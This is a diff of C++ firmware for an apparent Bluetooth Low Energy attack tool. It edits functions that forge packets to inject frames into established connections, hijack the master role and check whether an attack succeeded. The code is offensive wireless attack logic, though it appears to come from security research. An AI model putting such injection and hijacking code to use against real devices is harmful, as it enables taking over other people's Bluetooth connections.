@@ -876,7 +876,8 @@ void BLEController::followConnection(uint16_t hopInterval, uint8_t hopIncrement,
 
 	// No connection update is expected
 	this->clearConnectionUpdate();
-	/*uint8_t reject_ind[] = {0x03,0x02, 0x0d, 0x06};
+	/*
+	uint8_t reject_ind[] = {0x03,0x02, 0x0d, 0x06};
 	this->setAttackPayload(reject_ind, 4);
 	this->startAttack(BLE_ATTACK_FRAME_INJECTION_TO_MASTER);
 	*/
@@ -988,22 +989,20 @@ void BLEController::executeInjectionToMaster() {
 	this->enterSlaveInjectionMode(145);
 
 	// Forge an empty data packet with MD bit set to 1
-
 	uint8_t tx_buffer[2];
-
+	/*
 	tx_buffer[0] = (0x01 & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3) | (1 << 4); // MD = 1
 	tx_buffer[1] = 0x00;
 	this->radio->updateTXBuffer(tx_buffer,2);
-
-
-	/*
-	 // Dirty version : working
-	this->attackStatus.payload[0] = (this->attackStatus.payload[0] & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3); // MD = 1
-	this->radio->updateTXBuffer(this->attackStatus.payload,this->attackStatus.size);
 	*/
+	 // Dirty version : working
+
+	 this->attackStatus.payload[0] = (this->attackStatus.payload[0] & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3); // MD = 1
+	 this->radio->updateTXBuffer(this->attackStatus.payload,this->attackStatus.size);
+	 this->simulatedSlaveSequenceNumbers.sn = (this->simulatedSlaveSequenceNumbers.sn + 1) % 2; // necessary ?
+	 this->simulatedSlaveSequenceNumbers.nesn = (this->simulatedSlaveSequenceNumbers.nesn + 1) % 2; // necessary ?
 	//this->setEmptyTransmitIndicator(true);
 
-	// this->simulatedSlaveSequenceNumbers.sn = (this->simulatedSlaveSequenceNumbers.sn + 1) % 2; // necessary ?
 
 }
 
@@ -1073,6 +1072,8 @@ bool BLEController::slaveRoleCallback(BLEPacket *pkt) {
 
 void BLEController::checkAttackSuccess() {
 	// We check if the injection was successful
+
+
 	if (
 			(this->attackStatus.attack == BLE_ATTACK_FRAME_INJECTION_TO_SLAVE  ||
 			this->attackStatus.attack == BLE_ATTACK_MASTER_HIJACKING ||
@@ -1401,6 +1402,7 @@ void BLEController::connectionSynchronizationProcessing(BLEPacket *pkt) {
 
 void BLEController::attackSynchronizationProcessing(BLEPacket *pkt) {
 	int32_t relativeTimestamp = (int32_t)(pkt->getTimestamp() - this->lastAnchorPoint);
+
 	if (relativeTimestamp > 2*1250) {
 	// If we received the packet after anchorPoint + 2*1250 us, it's a slave packet in response to our fake master packet
 		this->slavePacketProcessing(pkt);
